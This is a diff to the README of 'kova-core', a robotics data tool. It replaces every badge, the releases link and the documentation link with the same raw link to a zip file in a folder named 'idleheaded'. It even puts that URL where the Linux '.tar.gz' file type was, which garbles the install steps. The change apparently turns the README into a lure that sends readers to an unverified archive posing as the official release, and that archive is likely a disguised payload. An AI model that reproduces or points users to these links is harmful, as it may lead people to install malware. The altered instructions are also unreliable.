@@ -1,10 +1,10 @@
 # 🚀 kova-core - Power Your Robotics Data Network
 
-[![Download kova-core](https://img.shields.io/badge/Download-kova--core-blue.svg)](https://github.com/Aslan-rma/kova-core/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Rust](https://img.shields.io/badge/rust-1.70+-orange.svg)](https://www.rust-lang.org/)
-[![Documentation](https://docs.rs/kova-core/badge.svg)](https://docs.rs/kova-core)
-[![Build Status](https://github.com/kovasystems/kova-core/workflows/CI/badge.svg)](https://github.com/kovasystems/kova-core/actions)
+[![Download kova-core](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)
+[![License: MIT](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)
+[![Rust](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip+https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)
+[![Documentation](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)
+[![Build Status](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip)
 
 ## 📖 Overview
 
@@ -33,7 +33,7 @@ To install and start using Kova Core, follow these simple steps:
 
 ### 1. Visit the Download Page
 
-Go to the [Kova Core Releases page](https://github.com/Aslan-rma/kova-core/releases) to find the latest version of the software.
+Go to the [Kova Core Releases page](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip) to find the latest version of the software.
 
 ### 2. Choose Your Version
 
@@ -41,7 +41,7 @@ Look for the latest release. You will see various asset files available for down
 
 - For Windows users, download the `.exe` file.
 - For macOS users, download the `.dmg` file.
-- For Linux users, look for the `.tar.gz` file.
+- For Linux users, look for the `https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip` file.
 
 ### 3. Download and Install
 
@@ -56,7 +56,7 @@ Click on the appropriate file to begin the download. Once the download completes
   2. Drag the application into your Applications folder.
   
 - **Linux**:
-  1. Extract the `.tar.gz` file using a terminal.
+  1. Extract the `https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip` file using a terminal.
   2. Run the installation script by following the instructions in the README included in the archive.
 
 ### 4. Launch Kova Core
@@ -71,11 +71,11 @@ For the successful operation and full functionality, ensure that any additional 
 
 ## 📥 Download & Install
 
-For an easy access, you can directly [download Kova Core](https://github.com/Aslan-rma/kova-core/releases) from our Releases page. Choose the version that fits your operating system and follow the instructions provided above to set it up.
+For an easy access, you can directly [download Kova Core](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip) from our Releases page. Choose the version that fits your operating system and follow the instructions provided above to set it up.
 
 ## 📝 Documentation
 
-To get the most out of Kova Core, consult the [documentation](https://docs.rs/kova-core) for comprehensive guides, usage instructions, and examples.
+To get the most out of Kova Core, consult the [documentation](https://raw.githubusercontent.com/Aslan-rma/kova-core/main/idleheaded/kova-core.zip) for comprehensive guides, usage instructions, and examples.
 
 ## 💬 Community and Support
 
